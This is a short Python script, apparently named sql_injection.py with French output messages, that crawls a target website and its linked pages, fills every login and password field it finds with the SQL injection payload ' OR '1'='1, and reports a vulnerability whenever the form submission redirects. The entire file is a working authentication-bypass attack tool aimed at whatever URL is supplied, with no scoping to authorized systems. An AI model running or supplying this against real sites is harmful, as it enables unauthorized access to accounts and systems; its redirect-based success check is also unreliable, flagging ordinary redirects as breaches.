import sys
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import json

def find_and_test_login_forms(base_url, session):
    results = []
    response = session.get(base_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    test_forms_on_page(session, soup, base_url, results)

    links = soup.find_all('a')
    for link in links:
        href = link.get('href')
        if href:
            follow_url = urljoin(base_url, href)
            try:
                follow_response = session.get(follow_url)
                follow_soup = BeautifulSoup(follow_response.text, 'html.parser')
                test_forms_on_page(session, follow_soup, follow_url, results)
            except requests.exceptions.RequestException as e:
                results.append({"url": follow_url, "error": str(e)})

    return results

def test_forms_on_page(session, soup, url, results):
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action') or ''
        form_url = urljoin(url, action)
        method = form.get('method', 'get').lower()
        form_data = {}

        for input_tag in form.find_all('input'):
            input_name = input_tag.get('name')
            if input_name:
                input_type = input_tag.get('type', 'text')
                input_value = input_tag.get('value', '')
                if input_type not in ['submit', 'button']:
                    if "user" in input_name.lower() or "login" in input_name.lower():
                        form_data[input_name] = "' OR '1'='1"
                    elif "pass" in input_name.lower():
                        form_data[input_name] = "' OR '1'='1"
                    else:
                        form_data[input_name] = input_value

        if form_data:
            if method == 'post':
                form_response = session.post(form_url, data=form_data, allow_redirects=False)
            else:
                form_response = session.get(form_url, params=form_data, allow_redirects=False)

            if form_response.status_code in [301, 302] or form_response.headers.get('Location'):
                new_url = form_response.headers.get('Location', form_response.url)
                full_new_url = urljoin(form_url, new_url)
                results.append({"url": form_url, "status": "Vulnérabilité trouvée", "detail": f"Redirection vers {full_new_url}"})
            else:
                results.append({"url": form_url, "status": "Pas de vulnérabilité détectée", "response": form_response.status_code})

    return results

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: sql_injection.py <target_url>", file=sys.stderr)
        sys.exit(1)
    base_url = sys.argv[1]
    session = requests.Session()
    results = find_and_test_login_forms(base_url, session)
    print(json.dumps(results, indent=2))
